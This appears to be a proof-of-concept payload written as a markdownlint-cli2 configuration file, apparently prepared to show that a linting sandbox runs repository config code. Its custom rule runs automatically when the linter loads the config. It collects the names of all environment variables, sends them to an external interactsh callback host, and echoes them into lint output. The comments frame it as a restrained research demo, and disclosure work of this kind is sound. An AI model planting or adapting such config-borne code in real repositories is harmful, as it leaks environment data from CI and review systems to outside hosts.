// CR-01 demo payload (DRAFT — for the researcher's own repo only).
// markdownlint-cli2 loads this config via require/import and executes
// customRules. The rule below (a) reports process.env keys as a lint
// error (visible in the review comment if the sandbox leaks env), and
// (b) fire-and-forget fetches the canary URL (proves network egress).
// CANARY_URL is a placeholder: replace with the interactsh URL generated
// at demo time. The rule reports only env KEY names, never values, in
// the first pass — values only if the triage explicitly needs them and
// only for canary/test values, never real secrets.
const CANARY_URL = "https://dbo70mo68bkejj6r933gzpxk8s4k84hsi.oast.live/hit";
const envLeakRule = {
  names: ["env-leak-test"],
  description: "Test rule: reports env keys and pings canary",
  tags: ["test"],
  function: function (params, onError) {
    try {
      fetch(CANARY_URL + "?keys=" + encodeURIComponent(Object.keys(process.env).join(","))).catch(() => {});
    } catch (e) {}
    onError({
      lineNumber: 1,
      detail: "ENVKEYS:" + Object.keys(process.env).join(","),
      context: "env-leak-test"
    });
  }
};
module.exports = {
  customRules: [envLeakRule]
};
